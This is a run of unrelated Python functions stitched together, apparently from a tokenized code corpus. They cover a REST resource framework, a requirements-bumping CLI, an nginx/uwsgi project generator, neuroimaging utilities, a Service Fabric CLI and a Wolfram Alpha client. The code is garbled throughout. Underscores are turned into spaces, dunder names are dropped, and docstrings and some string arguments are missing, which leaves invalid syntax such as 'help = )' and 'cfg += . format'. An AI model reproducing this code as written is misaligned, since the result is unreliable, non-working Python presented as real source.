def post ( self , request , response ) : if self . slug is not None : # Don't know what to do an item access. raise http . exceptions . Not Implemented ( ) # Ensure we're allowed to create a resource. self . assert operations ( 'create' ) # Deserialize and clean the incoming object. data = self . clean ( None , self . request . read ( deserialize = True ) ) # Delegate to `create` to create the item. item = self . create ( data ) # Build the response object. self . response . status = http . client . CREATED self . make response ( item )
def put ( self , request , response ) : if self . slug is None : # Mass-PUT is not implemented. raise http . exceptions . Not Implemented ( ) # Check if the resource exists. target = self . read ( ) # Deserialize and clean the incoming object. data = self . clean ( target , self . request . read ( deserialize = True ) ) if target is not None : # Ensure we're allowed to update the resource. self . assert operations ( 'update' ) try : # Delegate to `update` to create the item. self . update ( target , data ) except Attribute Error : # No read method defined. raise http . exceptions . Not Implemented ( ) # Build the response object. self . make response ( target ) else : # Ensure we're allowed to create the resource. self . assert operations ( 'create' ) # Delegate to `create` to create the item. target = self . create ( data ) # Build the response object. self . response . status = http . client . CREATED self . make response ( target )
def delete ( self , request , response ) : if self . slug is None : # Mass-DELETE is not implemented. raise http . exceptions . Not Implemented ( ) # Ensure we're allowed to destroy a resource. self . assert operations ( 'destroy' ) # Delegate to `destroy` to destroy the item. self . destroy ( ) # Build the response object. self . response . status = http . client . NO CONTENT self . make response ( )
def create project ( self ) : if os . path . exists ( self . py ) : prj dir = os . path . join ( self . app dir , self . project name ) if os . path . exists ( prj dir ) : if self . force : logging . warn ( 'Removing existing project' ) shutil . rmtree ( prj dir ) else : logging . warn ( 'Found existing project; not creating (use --force to overwrite)' ) return logging . info ( 'Creating project' ) p = subprocess . Popen ( 'cd {0} ; {1} startproject {2} > /dev/null' . format ( self . app dir , self . ve dir + os . sep + self . project name + os . sep + 'bin' + os . sep + 'django-admin.py' , self . project name ) , shell = True ) os . waitpid ( p . pid , 0 ) else : logging . error ( 'Unable to find Python interpreter in virtualenv' ) return
def parse ( text , encoding = 'utf8' ) : # Decode the text if we got bytes. if isinstance ( text , six . binary type ) : text = text . decode ( encoding ) return Query ( text , split segments ( text ) )
def split segments ( text , closing paren = False ) : buf = String IO ( ) # The segments we're building, and the combinators used to combine them. # Note that after this is complete, this should be true: # len(segments) == len(combinators) + 1 # Thus we can understand the relationship between segments and combinators # like so: #  s1 (c1) s2 (c2) s3 (c3) where s N are segments and c N are combination # functions. # TODO: Figure out exactly where the querystring died and post cool # error messages about it. segments = [ ] combinators = [ ] # A flag dictating if the last character we processed was a group. # This is used to determine if the next character (being a combinator) # is allowed to last group = False # The recursive nature of this function relies on keeping track of the # state of iteration.  This iterator will be passed down to recursed calls. iterator = iter ( text ) # Detection for exclamation points.  only matters for this situation: # foo=bar&!(bar=baz) last negation = False for character in iterator : if character in COMBINATORS : if last negation : buf . write ( constants . OPERATOR NEGATION ) # The string representation of our segment. val = buf . getvalue ( ) reset stringio ( buf ) if not last group and not len ( val ) : raise Value Error ( 'Unexpected %s.' % character ) # When a group happens, the previous value is empty. if len ( val ) : segments . append ( parse segment ( val ) ) combinators . append ( COMBINATORS [ character ] ) elif character == constants . GROUP BEGIN : # Recursively go into the next group. if buf . tell ( ) : raise Value Error ( 'Unexpected %s' % character ) seg = split segments ( iterator , True ) if last negation : seg = Unary Segment Combinator ( seg ) segments . append ( seg ) # Flag that the last entry was a grouping, so that we don't panic # when the next character is a logical combinator last group = True continue elif character == constants . GROUP END : # Build the segment for anything remaining, and then combine # all the segments. val = buf . getvalue ( ) # Check for unbalanced parens or an empty thing: foo=bar&();bar=baz if not buf . tell ( ) or not closing paren : raise Value Error ( 'Unexpected %s' % character ) segments . append ( parse segment ( val ) ) return combine ( segments , combinators ) elif character == constants . OPERATOR NEGATION and not buf . tell ( ) : last negation = True continue else : if last negation : buf . write ( constants . OPERATOR NEGATION ) if last group : raise Value Error ( 'Unexpected %s' % character ) buf . write ( character ) last negation = False last group = False else : # Check and see if the iterator exited early (unbalanced parens) if closing paren : raise Value Error ( 'Expected %s.' % constants . GROUP END ) if not last group : # Add the final segment. segments . append ( parse segment ( buf . getvalue ( ) ) ) # Everything completed normally, combine all the segments into one # and return them. return combine ( segments , combinators )
def parse segment ( text ) : if not len ( text ) : return Noop Query Segment ( ) q = Query Segment ( ) # First we need to split the segment into key/value pairs.  This is done # by attempting to split the sequence for each equality comparison.  Then # discard any that did not split properly.  Then chose the smallest key # (greedily chose the first comparator we encounter in the string) # followed by the smallest value (greedily chose the largest comparator # possible.) # translate into [('=', 'foo=bar')] equalities = zip ( constants . OPERATOR EQUALITIES , itertools . repeat ( text ) ) # Translate into [('=', ['foo', 'bar'])] equalities = map ( lambda x : ( x [ 0 ] , x [ 1 ] . split ( x [ 0 ] , 1 ) ) , equalities ) # Remove unsplit entries and translate into [('=': ['foo', 'bar'])] # Note that the result from this stage is iterated over twice. equalities = list ( filter ( lambda x : len ( x [ 1 ] ) > 1 , equalities ) ) # Get the smallest key and use the length of that to remove other items key len = len ( min ( ( x [ 1 ] [ 0 ] for x in equalities ) , key = len ) ) equalities = filter ( lambda x : len ( x [ 1 ] [ 0 ] ) == key len , equalities ) # Get the smallest value length. thus we have the earliest key and the # smallest value. op , ( key , value ) = min ( equalities , key = lambda x : len ( x [ 1 ] [ 1 ] ) ) key , directive = parse directive ( key ) if directive : op = constants . OPERATOR EQUALITY FALLBACK q . directive = directive # Process negation.  This comes in both foo.not= and foo!= forms. path = key . split ( constants . SEP PATH ) last = path [ - 1 ] # Check for != if last . endswith ( constants . OPERATOR NEGATION ) : last = last [ : - 1 ] q . negated = not q . negated # Check for foo.not= if last == constants . PATH NEGATION : path . pop ( - 1 ) q . negated = not q . negated q . values = value . split ( constants . SEP VALUE ) # Check for suffixed operators (foo.gte=bar).  Prioritize suffixed # entries over actual equality checks. if path [ - 1 ] in constants . OPERATOR SUFFIXES : # The case where foo.gte<=bar, which obviously makes no sense. if op not in constants . OPERATOR FALLBACK : raise Value Error ( 'Both path-style operator and equality style operator ' 'provided.  Please provide only a single style operator.' ) q . operator = constants . OPERATOR SUFFIX MAP [ path [ - 1 ] ] path . pop ( - 1 ) else : q . operator = constants . OPERATOR EQUALITY MAP [ op ] if not len ( path ) : raise Value Error ( 'No attribute navigation path provided.' ) q . path = path return q
def set ( self , target , value ) : if not self . set : return if self . path is None : # There is no path defined on this resource. # We can do no magic to set the value. self . set = lambda * a : None return None if self . segments [ target . class ] : # Attempt to resolve access to this attribute. self . get ( target ) if self . segments [ target . class ] : # Attribute is not fully resolved; an interim segment is null. return # Resolve access to the parent object. # For a single-segment path this will effectively be a no-op. parent getter = compose ( * self . getters [ target . class ] [ : - 1 ] ) target = parent getter ( target ) # Make the setter. func = self . make setter ( self . path . split ( '.' ) [ - 1 ] , target . class ) # Apply the setter now. func ( target , value ) # Replace this function with the constructed setter. def setter ( target , value ) : func ( parent getter ( target ) , value ) self . set = setter
def indexes Optional ( f ) : stack = inspect . stack ( ) NO INDEX CHECK NEEDED . add ( '%s.%s.%s' % ( f . module , stack [ 1 ] [ 3 ] , f . name ) ) del stack return f
def get method ( self , * args , * * kwargs ) : for method in self . gen methods ( * args , * * kwargs ) : return method msg = 'No method was found for %r on %r.' raise self . Dispatch Error ( msg % ( ( args , kwargs ) , self . inst ) )
def gen methods ( self , * args , * * kwargs ) : token = args [ 0 ] inst = self . inst prefix = self . method prefix for method key in self . gen method keys ( * args , * * kwargs ) : method = getattr ( inst , prefix + method key , None ) if method is not None : yield method # Fall back to built-in types, then types, then collections. typename = type ( token ) . name yield from self . check basetype ( token , typename , self . builtins . get ( typename ) ) for basetype name in self . interp types : yield from self . check basetype ( token , basetype name , getattr ( self . types , basetype name , None ) ) for basetype name in self . abc types : yield from self . check basetype ( token , basetype name , getattr ( self . collections , basetype name , None ) ) # Try the generic handler. yield from self . gen generic ( )
def require ( self , req ) : reqs = req if isinstance ( req , list ) else [ req ] for req in reqs : if not isinstance ( req , Bump Requirement ) : req = Bump Requirement ( req ) req . required = True req . required by = self self . requirements . append ( req )
def reverse ( self ) : if self . original target content : with open ( self . target , 'w' ) as fp : fp . write ( self . original target content )
def cons ( collection , value ) : if isinstance ( value , collections . Mapping ) : if collection is None : collection = { } collection . update ( * * value ) elif isinstance ( value , six . string types ) : if collection is None : collection = [ ] collection . append ( value ) elif isinstance ( value , collections . Iterable ) : if collection is None : collection = [ ] collection . extend ( value ) else : if collection is None : collection = [ ] collection . append ( value ) return collection
def merge ( options , name , bases , default = None ) : result = None for base in bases : if base is None : continue value = getattr ( base , name , None ) if value is None : continue result = utils . cons ( result , value ) value = options . get ( name ) if value is not None : result = utils . cons ( result , value ) return result or default
def package info ( cls , package ) : if package not in cls . package info cache : package json url = 'https://pypi.python.org/pypi/%s/json' % package try : logging . get Logger ( 'requests' ) . set Level ( logging . WARN ) response = requests . get ( package json url ) response . raise for status ( ) cls . package info cache [ package ] = simplejson . loads ( response . text ) except Exception as e : log . debug ( 'Could not get package info from %s: %s' , package json url , e ) cls . package info cache [ package ] = None return cls . package info cache [ package ]
def all package versions ( package ) : info = Py PI . package info ( package ) return info and sorted ( info [ 'releases' ] . keys ( ) , key = lambda x : x . split ( ) , reverse = True ) or [ ]
def insert ( self , name , index , value ) : return self . sequence [ name ] . insert ( index , value )
def send ( self , * args , * * kwargs ) : self . write ( * args , * * kwargs ) self . flush ( )
def insert ( self , name , index , value ) : return self . headers . insert ( index , value )
def create project ( self ) : if os . path . exists ( self . py ) : prj dir = os . path . join ( self . app dir , self . project name ) if os . path . exists ( prj dir ) : if self . force : logging . warn ( 'Removing existing project' ) shutil . rmtree ( prj dir ) else : logging . warn ( 'Found existing project; not creating (use --force to overwrite)' ) return logging . info ( 'Creating project' ) os . makedirs ( prj dir ) # create the flask project stub app = """#!/usr/bin/env python\n""" """from flask import Flask\n""" """app = Flask( name )\n\n""" """@app.route(\"/\")\n""" """def hello():\n""" """    return \"Hello from Flask...\"\n\n""" """if  name ==\" main \":\n""" """    app.run()\n\n""" with open ( os . path . join ( prj dir , 'app.py' ) , 'w' ) as f : f . write ( app ) else : logging . error ( 'Unable to find Python interpreter in virtualenv' ) return
def urls ( cls ) : return urls . patterns ( '' , urls . url ( r'^{}(?:$|(?P<path>[/:(.].*))' . format ( cls . meta . name ) , cls . view , name = 'armet-api-{}' . format ( cls . meta . name ) , kwargs = { 'resource' : cls . meta . name } ) )
def bump ( ) : parser = argparse . Argument Parser ( description = bump . doc ) parser . add argument ( 'names' , nargs = '*' , help = ) parser . add argument ( '--add' , '--require' , action = 'store true' , help = 'Add the `names` to the requirements file if they don\'t exist.' ) parser . add argument ( '--file' , help = 'Requirement file to bump. Defaults to requirements.txt and pinned.txt' ) parser . add argument ( '--force' , action = 'store true' , help = 'Force a bump even when certain bump requirements are not met.' ) parser . add argument ( '-d' , '--detail' , '--dependencies' , action = 'store true' , help = 'If available, show detailed changes. ' 'For pinned.txt, pin parsed dependency requirements from changes' ) parser . add argument ( '-n' , '--dry-run' , action = 'store true' , help = 'Perform a dry run without making changes' ) parser . add argument ( '--debug' , action = 'store true' , help = 'Turn on debug mode' ) args = parser . parse args ( ) targets = [ args . file ] if args . file else [ 'requirements.txt' , 'pinned.txt' ] level = logging . DEBUG if args . debug else logging . INFO logging . basic Config ( level = level , format = '[%(levelname)s] %(message)s' ) try : bumper = Bumper Driver ( targets , full throttle = args . force , detail = args . detail , test drive = args . dry run ) bumper . bump ( args . names , required = args . add , show detail = args . detail ) except Exception as e : if args . debug : raise else : log . error ( e ) sys . exit ( 1 )
def expand targets ( self , targets , base dir = None ) : all targets = [ ] for target in targets : target dirs = [ p for p in [ base dir , os . path . dirname ( target ) ] if p ] target dir = target dirs and os . path . join ( * target dirs ) or '' target = os . path . basename ( target ) target path = os . path . join ( target dir , target ) if os . path . exists ( target path ) : all targets . append ( target path ) with open ( target path ) as fp : for line in fp : if line . startswith ( '-r ' ) : , new target = line . split ( ' ' , 1 ) all targets . extend ( self . expand targets ( [ new target . strip ( ) ] , base dir = target dir ) ) return all targets
def get nginx config ( self ) : if os . path . exists ( self . nginx config ) : return open ( self . nginx config , 'r' ) . read ( ) else : return None
def check directories ( self ) : self . log . debug ( 'Checking directories' ) if not os . path . exists ( self . ve dir ) : os . makedirs ( self . ve dir ) if not os . path . exists ( self . app dir ) : os . makedirs ( self . app dir ) if not os . path . exists ( self . conf dir ) : os . makedirs ( self . conf dir ) if not os . path . exists ( self . var dir ) : os . makedirs ( self . var dir ) if not os . path . exists ( self . log dir ) : os . makedirs ( self . log dir ) if not os . path . exists ( self . script dir ) : os . makedirs ( self . script dir ) # copy uswgi params for nginx uwsgi params = '/etc/nginx/uwsgi params' if os . path . exists ( uwsgi params ) : shutil . copy ( uwsgi params , self . conf dir ) else : logging . warning ( 'Unable to find Nginx uwsgi params.  You must manually copy this to {0}.' . format ( self . conf dir ) ) # copy mime.types for nginx mime types = '/etc/nginx/mime.types' if os . path . exists ( mime types ) : shutil . copy ( mime types , self . conf dir ) self . include mimetypes = True else : logging . warn ( 'Unable to find mime.types for Nginx.  You must manually copy this to {0}.' . format ( self . conf dir ) )
def create virtualenv ( self ) : if check command ( 'virtualenv' ) : ve dir = os . path . join ( self . ve dir , self . project name ) if os . path . exists ( ve dir ) : if self . force : logging . warn ( 'Removing existing virtualenv' ) shutil . rmtree ( ve dir ) else : logging . warn ( 'Found existing virtualenv; not creating (use --force to overwrite)' ) return logging . info ( 'Creating virtualenv' ) p = subprocess . Popen ( 'virtualenv --no-site-packages {0} > /dev/null' . format ( ve dir ) , shell = True ) os . waitpid ( p . pid , 0 ) # install modules for m in self . modules : self . log . info ( 'Installing module {0}' . format ( m ) ) p = subprocess . Popen ( '{0} install {1} > /dev/null' . format ( os . path . join ( self . ve dir , self . project name ) + os . sep + 'bin' + os . sep + 'pip' , m ) , shell = True ) os . waitpid ( p . pid , 0 )
def create nginx config ( self ) : cfg = '# nginx config for {0}\n' . format ( self . project name ) if not self . shared hosting : # user if self . user : cfg += 'user {0};\n' . format ( self . user ) # misc nginx config cfg += . format ( os . path . join ( self . log dir , self . project name ) , os . path . join ( self . var dir , self . project name ) ) cfg += 'events {\n\tworker connections 32;\n}\n\n' # http section cfg += 'http {\n' if self . include mimetypes : cfg += '\tinclude mime.types;\n' cfg += '\tdefault type application/octet-stream;\n' cfg += '\tclient max body size 1G;\n' cfg += '\tproxy max temp file size 0;\n' cfg += '\tproxy buffering off;\n' cfg += '\taccess log {0}-access.log;\n' . format ( os . path . join ( self . log dir , self . project name ) ) cfg += '\tsendfile on;\n' cfg += '\tkeepalive timeout 65;\n' # server section cfg += '\tserver {\n' cfg += '\t\tlisten 0.0.0.0:{0};\n' . format ( self . port ) if self . server name : cfg += '\t\tserver name {0};\n' . format ( self . server name ) # location section cfg += '\t\tlocation / {\n' cfg += '\t\t\tuwsgi pass unix:///{0}.sock;\n' . format ( os . path . join ( self . var dir , self . project name ) ) cfg += '\t\t\tinclude uwsgi params;\n' cfg += '\t\t}\n\n' # end location # error page templates cfg += '\t\terror page 500 502 503 504 /50x.html;\n' cfg += '\t\tlocation = /50x.html {\n' cfg += '\t\t\troot html;\n' # end error page section cfg += '\t\t}\n' # end server section cfg += '\t}\n' if not self . shared hosting : # end http section cfg += '}\n' # create conf f = open ( self . nginx config , 'w' ) f . write ( cfg ) f . close ( )
def create manage scripts ( self ) : # create start script start = '# start script for {0}\n\n' . format ( self . project name ) # start uwsgi start += 'echo \'Starting u WSGI...\'\n' start += 'sh {0}.uwsgi\n' . format ( os . path . join ( self . conf dir , self . project name ) ) start += 'sleep 1\n' # start nginx start += 'echo \'Starting Nginx...\'\n' start += 'nginx -c {0} nginx.conf\n' . format ( os . path . join ( self . conf dir , self . project name ) ) start += 'sleep 1\n' start += 'echo \'{0} started\'\n\n' . format ( self . project name ) # stop script stop = '# stop script for {0}\n\n' . format ( self . project name ) # stop nginx stop += 'if [ -e {0} nginx.pid ]; then nginx -c {1} nginx.conf -s stop ; fi\n' . format ( os . path . join ( self . var dir , self . project name ) , os . path . join ( self . conf dir , self . project name ) ) # stop uwsgi stop += 'if [ -e {0} uwsgi.pid ]; then kill -9 `cat {0} uwsgi.pid` ; rm {0} uwsgi.pid 2>&1 > /dev/null ; fi\n' . format ( os . path . join ( self . var dir , self . project name ) ) stop += 'echo \'{0} stopped\'\n' . format ( self . project name ) # write scripts start file = '{0} start.sh' . format ( os . path . join ( self . script dir , self . project name ) ) stop file = '{0} stop.sh' . format ( os . path . join ( self . script dir , self . project name ) ) f = open ( start file , 'w' ) f . write ( start ) f . close ( ) f = open ( stop file , 'w' ) f . write ( stop ) f . close ( ) # make executable os . chmod ( start file , 0754 ) os . chmod ( stop file , 0754 )
def create ( self ) : # create virtualenv self . create virtualenv ( ) # create project self . create project ( ) # generate uwsgi script self . create uwsgi script ( ) # generate nginx config self . create nginx config ( ) # generate management scripts self . create manage scripts ( ) logging . info ( '** Make sure to set proper permissions for the webserver user account on the var and log directories in the project root' )
def dasherize ( value ) : value = value . strip ( ) value = re . sub ( r'([A-Z])' , r'-\1' , value ) value = re . sub ( r'[- \s]+' , r'-' , value ) value = re . sub ( r'^-' , r'' , value ) value = value . lower ( ) return value
def redirect ( cls , request , response ) : if cls . meta . legacy redirect : if request . method in ( 'GET' , 'HEAD' , ) : # A SAFE request is allowed to redirect using a 301 response . status = http . client . MOVED PERMANENTLY else : # All other requests must use a 307 response . status = http . client . TEMPORARY REDIRECT else : # Modern redirects are allowed. Let's have some fun. # Hopefully you're client supports this. # The RFC explicitly discourages User Agent sniffing. response . status = http . client . PERMANENT REDIRECT # Terminate the connection. response . close ( )
def require authentication ( self , request ) : request . user = user = None if request . method == 'OPTIONS' : # Authentication should not be checked on an OPTIONS request. return for auth in self . meta . authentication : user = auth . authenticate ( request ) if user is False : # Authentication protocol failed to authenticate; # pass the baton. continue if user is None and not auth . allow anonymous : # Authentication protocol determined the user is # unauthenticated. auth . unauthenticated ( ) # Authentication protocol determined the user is indeed # authenticated (or not); Store the user for later reference. request . user = user return if not user and not auth . allow anonymous : # No authenticated user found and protocol doesn't allow # anonymous users. auth . unauthenticated ( )
def require accessibility ( self , user , method ) : if method == 'OPTIONS' : # Authorization should not be checked on an OPTIONS request. return authz = self . meta . authorization if not authz . is accessible ( user , method , self ) : # User is not authorized; raise an appropriate message. authz . unaccessible ( )
def require http allowed method ( cls , request ) : allowed = cls . meta . http allowed methods if request . method not in allowed : # The specified method is not allowed for the resource # identified by the request URI. # RFC 2616  10.4.6  405 Method Not Allowed raise http . exceptions . Method Not Allowed ( allowed )
def resource ( * * kwargs ) : def inner ( function ) : name = kwargs . pop ( 'name' , None ) if name is None : name = utils . dasherize ( function . name ) methods = kwargs . pop ( 'methods' , None ) if isinstance ( methods , six . string types ) : # Tuple-ify the method if we got just a string. methods = methods , # Construct a handler. handler = ( function , methods ) if name not in resources : # Initiate the handlers list. handlers [ name ] = [ ] # Construct a light-weight resource using the passed kwargs # as the arguments for the meta. from armet import resources kwargs [ 'name' ] = name class Lightweight Resource ( resources . Resource ) : Meta = type ( str ( 'Meta' ) , ( ) , kwargs ) def route ( self , request , response ) : for handler , methods in handlers [ name ] : if methods is None or request . method in methods : return handler ( request , response ) resources . Resource . route ( self ) # Construct and add this resource. resources [ name ] = Lightweight Resource # Add this to the handlers. handlers [ name ] . append ( handler ) # Return the resource. return resources [ name ] # Return the inner method. return inner
def render to string ( self ) : values = '' for key , value in self . items ( ) : values += '{}={};' . format ( key , value ) return values
def from cookie string ( self , cookie string ) : for key value in cookie string . split ( ';' ) : if '=' in key value : key , value = key value . split ( '=' , 1 ) else : key = key value strip key = key . strip ( ) if strip key and strip key . lower ( ) not in COOKIE ATTRIBUTE NAMES : self [ strip key ] = value . strip ( )
def error handler ( func ) : @ wraps ( func ) def wrapper ( * args , * * kwargs ) : try : return func ( * args , * * kwargs ) except Base Exception as err : # Do not catch exceptions on testing if BOOTSTRAPPER TEST KEY in os . environ : raise # Fail silently if error handling disabled if ERROR HANDLER DISABLED : return True # Otherwise save traceback to log return save traceback ( err ) return wrapper
def iteritems ( data , * * kwargs ) : return iter ( data . items ( * * kwargs ) ) if IS PY3 else data . iteritems ( * * kwargs )
def iterkeys ( data , * * kwargs ) : return iter ( data . keys ( * * kwargs ) ) if IS PY3 else data . iterkeys ( * * kwargs )
def remove nodes ( self , pattern , adict ) : mydict = self . filetree if adict is None else adict if isinstance ( mydict , dict ) : for nom in mydict . keys ( ) : if isinstance ( mydict [ nom ] , dict ) : matchs = filter list ( mydict [ nom ] , pattern ) for nom in matchs : mydict = self . remove nodes ( pattern , mydict [ nom ] ) mydict . pop ( nom ) else : mydict [ nom ] = filter list ( mydict [ nom ] , pattern ) else : matchs = set ( filter list ( mydict , pattern ) ) mydict = set ( mydict ) - matchs return mydict
def num samples ( x ) : if not hasattr ( x , ' len ' ) and not hasattr ( x , 'shape' ) : if hasattr ( x , ' array ' ) : x = np . asarray ( x ) else : raise Type Error ( "Expected sequence or array-like, got %r" % x ) return x . shape [ 0 ] if hasattr ( x , 'shape' ) else len ( x )
def voxspace to mmspace ( img ) : shape , affine = img . shape [ : 3 ] , img . affine coords = np . array ( np . meshgrid ( * ( range ( i ) for i in shape ) , indexing = 'ij' ) ) coords = np . rollaxis ( coords , 0 , len ( shape ) + 1 ) mm coords = nib . affines . apply affine ( affine , coords ) return mm coords
def load images and labels ( self , images , labels = None ) : if not isinstance ( images , ( list , tuple ) ) : raise Value Error ( 'Expected an iterable (list or tuple) of strings or img-like objects. ' 'Got a {}.' . format ( type ( images ) ) ) if not len ( images ) > 0 : raise Value Error ( 'Expected an iterable (list or tuple) of strings or img-like objects ' 'of size higher than 0. Got {} items.' . format ( len ( images ) ) ) if labels is not None and len ( labels ) != len ( images ) : raise Value Error ( 'Expected the same length for image set ({}) and ' 'labels list ({}).' . format ( len ( images ) , len ( labels ) ) ) first file = images [ 0 ] if first file : first img = Neuro Image ( first file ) else : raise ( 'Error reading image {}.' . format ( repr imgs ( first file ) ) ) for idx , image in enumerate ( images ) : try : img = Neuro Image ( image ) self . check compatibility ( img , first img ) except : log . exception ( 'Error reading image {}.' . format ( repr imgs ( image ) ) ) raise else : self . items . append ( img ) self . set labels ( labels )
def die ( msg , code = - 1 ) : sys . stderr . write ( msg + "\n" ) sys . exit ( code )
def clean ( ctx ) : ctx . run ( f'python setup.py clean' ) dist = ROOT . joinpath ( 'dist' ) print ( f'removing {dist}' ) shutil . rmtree ( str ( dist ) )
def load command table ( self , args ) : #pylint: disable=too-many-statements # Need an empty client for the select and upload operations with Command Super Group ( name , self , 'rcctl.custom cluster#{}' ) as super group : with super group . group ( 'cluster' ) as group : group . command ( 'select' , 'select' ) with Command Super Group ( name , self , 'rcctl.custom reliablecollections#{}' , client factory = client create ) as super group : with super group . group ( 'dictionary' ) as group : group . command ( 'query' , 'query reliabledictionary' ) group . command ( 'execute' , 'execute reliabledictionary' ) group . command ( 'schema' , 'get reliabledictionary schema' ) group . command ( 'list' , 'get reliabledictionary list' ) group . command ( 'type-schema' , 'get reliabledictionary type schema' ) with Arguments Context ( self , 'dictionary' ) as ac : ac . argument ( 'application name' , options list = [ '--application-name' , '-a' ] ) ac . argument ( 'service name' , options list = [ '--service-name' , '-s' ] ) ac . argument ( 'dictionary name' , options list = [ '--dictionary-name' , '-d' ] ) ac . argument ( 'output file' , options list = [ '--output-file' , '-out' ] ) ac . argument ( 'input file' , options list = [ '--input-file' , '-in' ] ) ac . argument ( 'query string' , options list = [ '--query-string' , '-q' ] ) ac . argument ( 'type name' , options list = [ '--type-name' , '-t' ] ) return Ordered Dict ( self . command table )
def div img ( img1 , div2 ) : if is img ( div2 ) : return img1 . get data ( ) / div2 . get data ( ) elif isinstance ( div2 , ( float , int ) ) : return img1 . get data ( ) / div2 else : raise Not Implemented Error ( 'Cannot divide {}({}) by ' '{}({})' . format ( type ( img1 ) , img1 , type ( div2 ) , div2 ) )
def apply mask ( img , mask ) : from . mask import apply mask vol , = apply mask ( img , mask ) return vector to volume ( vol , read img ( mask ) . get data ( ) . astype ( bool ) )
def abs img ( img ) : bool img = np . abs ( read img ( img ) . get data ( ) ) return bool img . astype ( int )
def spatial map ( icc , thr , mode = '+' ) : return thr img ( icc img to zscore ( icc ) , thr = thr , mode = mode ) . get data ( )
def smooth fwhm ( self , fwhm ) : if fwhm != self . smooth fwhm : self . is data smooth = False self . smooth fwhm = fwhm
def setup logging ( log config file = op . join ( op . dirname ( file ) , 'logger.yml' ) , log default level = LOG LEVEL , env key = MODULE NAME . upper ( ) + ' LOG CFG' ) : path = log config file value = os . getenv ( env key , None ) if value : path = value if op . exists ( path ) : log cfg = yaml . load ( read ( path ) . format ( MODULE NAME ) ) logging . config . dict Config ( log cfg ) #print('Started logging using config file {0}.'.format(path)) else : logging . basic Config ( level = log default level ) #print('Started default logging. Could not find config file ' #      'in {0}.'.format(path)) log = logging . get Logger ( name ) log . debug ( 'Start logging.' )
def select arg verify ( endpoint , cert , key , pem , ca , aad , no verify ) : #pylint: disable=invalid-name,too-many-arguments if not ( endpoint . lower ( ) . startswith ( 'http' ) or endpoint . lower ( ) . startswith ( 'https' ) ) : raise CLI Error ( 'Endpoint must be HTTP or HTTPS' ) usage = ( 'Valid syntax : --endpoint [ [ --key --cert | --pem | --aad] ' '[ --ca | --no-verify ] ]' ) if ca and not ( pem or all ( [ key , cert ] ) ) : raise CLI Error ( usage ) if no verify and not ( pem or all ( [ key , cert ] ) or aad ) : raise CLI Error ( usage ) if no verify and ca : raise CLI Error ( usage ) if any ( [ cert , key ] ) and not all ( [ cert , key ] ) : raise CLI Error ( usage ) if aad and any ( [ pem , cert , key ] ) : raise CLI Error ( usage ) if pem and any ( [ cert , key ] ) : raise CLI Error ( usage )
def openpyxl read xl ( xl path : str ) : try : wb = load workbook ( filename = xl path , read only = True ) except : raise else : return wb
def read xl ( xl path : str ) : xl path , choice = check xl path ( xl path ) reader = XL READERS [ choice ] return reader ( xl path )
def col values ( df , col name ) : check cols ( df , [ col name ] ) if 'O' in df [ col name ] or pd . np . issubdtype ( df [ col name ] . dtype , str ) : # if the column is of strings return [ nom . lower ( ) for nom in df [ pd . notnull ( df ) ] [ col name ] if not pd . isnull ( nom ) ] else : return [ nom for nom in df [ pd . notnull ( df ) ] [ col name ] if not pd . isnull ( nom ) ]
def duplicated ( values : Sequence ) : vals = pd . Series ( values ) return vals [ vals . duplicated ( ) ]
def repr imgs ( imgs ) : if isinstance ( imgs , string types ) : return imgs if isinstance ( imgs , collections . Iterable ) : return '[{}]' . format ( ', ' . join ( repr imgs ( img ) for img in imgs ) ) # try get filename try : filename = imgs . get filename ( ) if filename is not None : img str = "{}('{}')" . format ( imgs . class . name , filename ) else : img str = "{}(shape={}, affine={})" . format ( imgs . class . name , repr ( get shape ( imgs ) ) , repr ( imgs . get affine ( ) ) ) except Exception as exc : log . error ( 'Error reading attributes from img.get filename()' ) return repr ( imgs ) else : return img str
def get config bool ( name ) : cli config = CLI Config ( SF CLI CONFIG DIR , SF CLI ENV VAR PREFIX ) return cli config . getboolean ( 'servicefabric' , name , False )
def set config value ( name , value ) : cli config = CLI Config ( SF CLI CONFIG DIR , SF CLI ENV VAR PREFIX ) cli config . set value ( 'servicefabric' , name , value )
def set aad cache ( token , cache ) : set config value ( 'aad token' , jsonpickle . encode ( token ) ) set config value ( 'aad cache' , jsonpickle . encode ( cache ) )
def set aad metadata ( uri , resource , client ) : set config value ( 'authority uri' , uri ) set config value ( 'aad resource' , resource ) set config value ( 'aad client' , client )
def set auth ( pem = None , cert = None , key = None , aad = False ) : if any ( [ cert , key ] ) and pem : raise Value Error ( 'Cannot specify both pem and cert or key' ) if any ( [ cert , key ] ) and not all ( [ cert , key ] ) : raise Value Error ( 'Must specify both cert and key' ) if pem : set config value ( 'security' , 'pem' ) set config value ( 'pem path' , pem ) elif cert or key : set config value ( 'security' , 'cert' ) set config value ( 'cert path' , cert ) set config value ( 'key path' , key ) elif aad : set config value ( 'security' , 'aad' ) else : set config value ( 'security' , 'none' )
def dictify ( a named tuple ) : return dict ( ( s , getattr ( a named tuple , s ) ) for s in a named tuple . fields )
def create ( ) : endpoint = client endpoint ( ) if not endpoint : raise CLI Error ( "Connection endpoint not found. " "Before running sfctl commands, connect to a cluster using " "the 'sfctl cluster select' command." ) no verify = no verify setting ( ) if security type ( ) == 'aad' : auth = Adal Authentication ( no verify ) else : cert = cert info ( ) ca cert = ca cert info ( ) auth = Client Cert Authentication ( cert , ca cert , no verify ) return Service Fabric Client AP Is ( auth , base url = endpoint )
def escape char ( c , escape char = ESCAPE CHAR ) : buf = [ ] for byte in c . encode ( 'utf8' ) : buf . append ( escape char ) buf . append ( '%X' % ord ( byte ) ) return '' . join ( buf )
def copy attributes ( source , destination , ignore patterns = [ ] ) : for attr in wildcard filter ( dir ( source ) , * ignore patterns ) : setattr ( destination , attr , getattr ( source , attr ) )
def query ( self , input = '' , params = { } ) : # Get and construct query parameters # Default parameters payload = { 'input' : input , 'appid' : self . appid } # Additional parameters (from params), formatted for url for key , value in params . items ( ) : # Check if value is list or tuple type (needs to be comma joined) if isinstance ( value , ( list , tuple ) ) : payload [ key ] = ',' . join ( value ) else : payload [ key ] = value # Catch any issues with connecting to Wolfram Alpha API try : r = requests . get ( "http://api.wolframalpha.com/v2/query" , params = payload ) # Raise Exception (to be returned as error) if r . status code != 200 : raise Exception ( 'Invalid response status code: %s' % ( r . status code ) ) if r . encoding != 'utf-8' : raise Exception ( 'Invalid encoding: %s' % ( r . encoding ) ) except Exception , e : return Result ( error = e ) return Result ( xml = r . text )
def pods ( self ) : # Return empty list if xml tree is not defined (error Result object) if not self . xml tree : return [ ] # Create a Pod object for every pod group in xml return [ Pod ( elem ) for elem in self . xml tree . findall ( 'pod' ) ]
